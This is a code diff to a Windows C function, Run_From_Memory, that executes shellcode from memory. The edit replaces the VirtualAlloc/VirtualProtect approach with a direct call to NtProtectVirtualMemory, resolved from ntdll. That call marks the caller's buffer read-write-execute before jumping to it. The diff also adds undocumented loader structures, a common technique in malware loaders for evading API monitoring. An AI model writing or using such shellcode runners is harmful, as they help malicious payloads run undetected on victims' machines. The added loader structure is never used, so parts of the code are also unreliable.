@@ -1,33 +1,78 @@
-#include <windows.h> // Required for VirtualAlloc, VirtualProtect, VirtualFree, and related constants
-#include <string.h>  // Required for memcpy
+#include <windows.h>
+
+typedef struct _UNICODE_STRING {
+  USHORT Length;
+  USHORT MaximumLength;
+  PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    SHORT LoadCount;
+    SHORT TlsIndex;
+    LIST_ENTRY HashLinks;
+    ULONG TimeDateStamp;
+    PVOID DefaultLanguage;
+    PVOID LoadConfigurationInfo;
+    ULONG CodeIntegrityInfo;
+    ULONG CodeIntegrityPolicy;
+    ULONG VolatileInformation;
+    ULONG Reserved5;
+    ULONG Reserved6;
+    ULONG Reserved7;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID *BaseAddress,
+    IN OUT PSIZE_T RegionSize,
+    IN ULONG NewProtect,
+    OUT PULONG OldProtect
+);
 
 void Run_From_Memory(void *shellcode, int size) {
-    LPVOID exec_mem = NULL;
-    DWORD oldProtect = 0;
+    SIZE_T regionSize = (SIZE_T)size;
+    DWORD oldProtect;
+    NTSTATUS status;
 
-    // Allocate memory with read/write permissions
-    exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (exec_mem == NULL) {
-        // Allocation failed. In a real application, robust error handling would go here.
+    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+
+    if (NtProtectVirtualMemory == NULL) {
+        // Handle error: Could not find NtProtectVirtualMemory
         return;
     }
 
-    // Copy the shellcode into the allocated memory
-    memcpy(exec_mem, shellcode, size);
+    status = NtProtectVirtualMemory(
+        GetCurrentProcess(),
+        &shellcode,
+        &regionSize,
+        PAGE_EXECUTE_READWRITE,
+        &oldProtect
+    );
 
-    // Change memory protection to execute/read
-    if (!VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldProtect)) {
-        // Protection change failed. Clean up allocated memory.
-        VirtualFree(exec_mem, 0, MEM_RELEASE);
+    if (status != 0) {
+        // Handle error: NtProtectVirtualMemory failed
         return;
     }
 
-    // Cast the memory address to a function pointer and execute it
-    // The shellcode is expected to handle its own exit or return.
-    ((void (*)(void))exec_mem)();
+    typedef void (*ShellcodeFunc)();
+    ShellcodeFunc func = (ShellcodeFunc)shellcode;
+    func();
 
-    // After shellcode execution (if it returns), free the allocated memory.
-    // Note: Many shellcodes do not return, but instead terminate the process or
-    // jump to another location, in which case this VirtualFree might not be reached.
-    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    // Restore original protection (optional, but good practice)
+    NtProtectVirtualMemory(
+        GetCurrentProcess(),
+        &shellcode,
+        &regionSize,
+        oldProtect,
+        &oldProtect
+    );
 }
